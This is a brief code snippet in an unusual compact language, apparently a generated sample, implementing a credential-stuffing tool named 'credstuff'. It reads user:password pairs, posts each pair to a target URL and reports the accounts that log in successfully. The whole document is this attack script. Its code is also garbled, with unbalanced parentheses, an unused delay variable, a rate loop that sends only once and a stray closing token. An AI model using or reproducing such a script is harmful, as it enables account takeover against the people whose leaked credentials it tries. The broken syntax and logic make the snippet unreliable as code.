m=credstuff;f=solve(p0:$str;p1:$str;p2:$i64):$str{let url=p0;let rate=p2;let creds=mut.@();let lines=p1.split("\n");lp(let i=0;i<lines.len;i=i+1){let line=lines.get(i);if(!(line.len=0))){let parts=line.split(":");if(parts.len=2){creds=creds+@(parts.get(0));parts.get(1)));};};};let results=mut."";let n=creds.len;lp(let i=0;i<n;i=i+1){let cred=creds.get(i);let user=cred.get(0);let pwd=cred.get(1);let attempt=mut.0;let delay=mut.0;lp(let j=0;j<rate;j=j+1){let shouldsend=mut.false;if(!(attempt<1))){shouldsend=true;};if(shouldsend){let body="user="+user+"&pwd="+pwd;let res=std.http.post(url;body);let ok=res.status=200;let parsed=mut.false;if(ok){let p=std.json.parse(res.body);parsed=true;if(p.get("ok"))=true){let out="HIT: "+user;results=s.concat(results;out);};};};attempt=attempt+1;};};<results};